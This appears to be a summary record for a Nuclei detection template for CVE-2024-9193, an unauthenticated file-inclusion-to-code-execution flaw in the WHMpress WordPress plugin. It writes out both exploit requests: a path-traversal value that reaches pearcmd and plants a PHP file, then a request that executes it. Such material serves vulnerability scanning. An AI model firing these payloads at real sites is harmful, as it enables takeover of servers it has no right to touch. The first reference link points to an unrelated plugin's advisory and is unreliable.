---
cve_id: CVE-2024-9193
template_path: nuclei-templates/http/cves/2024/CVE-2024-9193.yaml
affected_product: WHMpress
severity: critical
authentication: none
external_callback: false
affected_versions: <= 6.3-revision-0
preconditions: []
poc_classification: rce
---

## Vulnerability
WHMpress - WHMCS WordPress Integration Plugin <= 6.3-revision-0 for WordPress suffers from unauthenticated local file inclusion via the `whmpress_domain_search_ajax_extended_results()` function. Attackers can include and execute arbitrary files (including PHP) on the server through the `params[style]` parameter, enabling bypass of access controls, sensitive data access, PHP code execution, and arbitrary WordPress options updates. The options manipulation can set the default registration role to administrator and enable registrations, granting full site control.

## PoC / Detection
Classification: rce

The template performs a two-step raw HTTP exploit to `/wp-admin/admin-ajax.php` (no authentication):

- Request 1: POST with `params[style]=../../../../../../../../../../../usr/local/lib/php/pearcmd` and query string `?+config-create+/&/<?=base64_decode($_GET[0])?>+/tmp/{{randstr}}.php` to abuse the LFI and PEAR config creation, writing a PHP file containing short-tag echo of `$_GET[0]` to `/tmp/{{randstr}}.php`.
- Request 2: POST with `params[style]=../../../../../../../../../../../tmp/{{randstr}}` and query `?0={{marker}}` (base64-encoded random string) to include and execute the written file.

DSL matchers verify success when `body_1` contains `whmpress_action` and `CHANNEL PEAR.PHP.NET` while `body_2` contains the random string and `PEAR_Config`.

## References
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/academist-membership/academist-membership-116-authentication-bypass-via-account-takeover
- https://whmpress.com/docs/change-log/
- https://www.wordfence.com/threat-intel/vulnerabilities/id/5f3b0e75-d2f0-48b7-ba33-75c4e998030e?source=cve
